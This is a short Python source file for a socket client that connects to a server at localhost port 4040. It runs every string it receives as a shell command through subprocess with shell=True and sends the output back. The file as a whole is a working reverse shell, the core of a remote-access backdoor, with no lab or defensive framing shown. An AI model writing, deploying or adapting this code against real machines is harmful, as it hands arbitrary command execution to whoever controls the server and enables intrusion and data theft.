#!/usr/bin/env python

import socket
import subprocess

class Client:

    def __init__(self, ipServer, portServer):
        self.IPServer = ipServer
        self.PortServer = portServer

    def createClient(self):
        self.oClient = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connectServer(self):
        try:
            self.oClient.connect((self.IPServer, self.PortServer))
            print(f"[+] Connection to server enable")
        except:
            print(f"[!] Error to enable connection with server")

    def recvCommands(self):
        while True:
            try:
                data = self.oClient.recv(1024)
                data = data.decode("utf-8")
                try:
                    output = subprocess.run(data, shell=True, capture_output=True, text=True)
                    if output.returncode == 1:
                        self.oClient.send("Command no found".encode("utf-8"))
                    else:
                        output = output.stdout
                        output= str(output)
                        self.oClient.send(output.encode("utf-8"))
                except:
                    pass
            except:
                pass

    def specialCMD(cmd):
        if cmd == "exit":
            return 1
        else:
            return 0

def main():
    oClient = Client("localhost", 4040)
    oClient.createClient()
    oClient.connectServer()
    oClient.recvCommands()


if __name__ == '__main__':
    main()